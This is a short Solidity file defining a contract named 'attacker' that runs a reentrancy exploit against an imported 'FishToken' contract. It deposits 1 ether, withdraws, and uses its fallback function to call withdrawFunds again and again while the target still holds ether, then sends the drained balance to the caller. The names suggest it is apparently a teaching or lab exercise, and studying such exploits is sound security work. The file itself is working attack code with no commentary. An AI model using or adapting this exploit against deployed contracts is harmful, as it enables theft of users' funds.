pragma solidity ^0.4.24;

import "./code.sol";

contract attacker {

    FishToken public fishToken;

    constructor(address _fishTokenAddress){
        fishToken = FishToken(_fishTokenAddress);
    }

    function pwnEtherStore() public payable {
        require(msg.value >= 1 ether);
        fishToken.issueTokens.value(1 ether)();
        fishToken.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    function() payable {
        if (fishToken.balance > 1 ether) {
            fishToken.withdrawFunds(1 ether);
        }
    }
}
